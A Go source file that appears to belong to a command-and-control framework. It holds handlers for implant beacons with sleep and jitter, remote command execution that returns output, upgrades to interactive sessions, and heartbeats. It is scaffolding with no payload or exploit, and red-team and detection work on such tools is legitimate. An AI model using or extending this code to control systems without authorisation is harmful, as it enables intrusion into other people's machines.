package handlers

import (
	"context"
	"fmt"
	"time"

	"github.com/ditto/ditto/core"
)

// BeaconHandler handles beacon messages
type BeaconHandler struct {
	*BaseHandler
	sessionManager *core.SessionManager
}

// NewBeaconHandler creates a new beacon handler
func NewBeaconHandler(logger interface {
	Info(string, ...interface{})
	Debug(string, ...interface{})
	Error(string, ...interface{})
}, sessionManager *core.SessionManager) *BeaconHandler {
	return &BeaconHandler{
		BaseHandler:    NewBaseHandler(logger),
		sessionManager: sessionManager,
	}
}

func (h *BeaconHandler) Type() MessageType {
	return MessageTypeBeacon
}

func (h *BeaconHandler) Handle(ctx context.Context, msg *Message, session *core.Session) (*Message, error) {
	session.UpdateLastSeen()
	
	// Extract metadata from beacon
	if metadata, ok := msg.Data["metadata"].(map[string]interface{}); ok {
		for k, v := range metadata {
			session.SetMetadata(k, v)
		}
	}
	
	// Get pending tasks for this session
	// TODO: Integrate with task queue
	
	response := CreateResponse(MessageTypeBeacon, session.ID, map[string]interface{}{
		"session_id": session.ID,
		"tasks":      []interface{}{},
		"sleep":      session.BeaconInterval.Seconds(),
		"jitter":     session.BeaconJitter,
	})
	
	return response, nil
}

// ExecuteHandler handles execute commands
type ExecuteHandler struct {
	*BaseHandler
	executor interface {
		Execute(command string) (string, error)
	}
}

// NewExecuteHandler creates a new execute handler
func NewExecuteHandler(logger interface {
	Info(string, ...interface{})
	Debug(string, ...interface{})
	Error(string, ...interface{})
}, executor interface {
	Execute(command string) (string, error)
}) *ExecuteHandler {
	return &ExecuteHandler{
		BaseHandler: NewBaseHandler(logger),
		executor:    executor,
	}
}

func (h *ExecuteHandler) Type() MessageType {
	return MessageTypeExecute
}

func (h *ExecuteHandler) Handle(ctx context.Context, msg *Message, session *core.Session) (*Message, error) {
	command, ok := msg.Data["command"].(string)
	if !ok {
		return CreateErrorResponse(session.ID, fmt.Errorf("missing command")), nil
	}
	
	h.logger.Info("Executing command: %s", command)
	
	output, err := h.executor.Execute(command)
	if err != nil {
		return CreateErrorResponse(session.ID, err), nil
	}
	
	response := CreateResponse(MessageTypeResult, session.ID, map[string]interface{}{
		"task_id": msg.ID,
		"status":  "success",
		"output":  output,
	})
	
	return response, nil
}

// UpgradeHandler handles session upgrade requests
type UpgradeHandler struct {
	*BaseHandler
	sessionManager *core.SessionManager
}

// NewUpgradeHandler creates a new upgrade handler
func NewUpgradeHandler(logger interface {
	Info(string, ...interface{})
	Debug(string, ...interface{})
	Error(string, ...interface{})
}, sessionManager *core.SessionManager) *UpgradeHandler {
	return &UpgradeHandler{
		BaseHandler:    NewBaseHandler(logger),
		sessionManager: sessionManager,
	}
}

func (h *UpgradeHandler) Type() MessageType {
	return MessageTypeUpgrade
}

func (h *UpgradeHandler) Handle(ctx context.Context, msg *Message, session *core.Session) (*Message, error) {
	if session.Type != core.SessionTypeBeacon {
		return CreateErrorResponse(session.ID, fmt.Errorf("session is not a beacon")), nil
	}
	
	// Upgrade to interactive session
	session.UpgradeToInteractive()
	
	h.logger.Info("Upgraded session %s to interactive", session.ID)
	
	response := CreateResponse(MessageTypeUpgrade, session.ID, map[string]interface{}{
		"status":      "success",
		"session_id":  session.ID,
		"session_type": "interactive",
	})
	
	return response, nil
}

// HeartbeatHandler handles heartbeat messages
type HeartbeatHandler struct {
	*BaseHandler
	sessionManager *core.SessionManager
}

// NewHeartbeatHandler creates a new heartbeat handler
func NewHeartbeatHandler(logger interface {
	Info(string, ...interface{})
	Debug(string, ...interface{})
	Error(string, ...interface{})
}, sessionManager *core.SessionManager) *HeartbeatHandler {
	return &HeartbeatHandler{
		BaseHandler:    NewBaseHandler(logger),
		sessionManager: sessionManager,
	}
}

func (h *HeartbeatHandler) Type() MessageType {
	return MessageTypeHeartbeat
}

func (h *HeartbeatHandler) Handle(ctx context.Context, msg *Message, session *core.Session) (*Message, error) {
	session.UpdateLastSeen()
	
	response := CreateResponse(MessageTypeHeartbeat, session.ID, map[string]interface{}{
		"status": "ok",
		"timestamp": time.Now().Unix(),
	})
	
	return response, nil
}

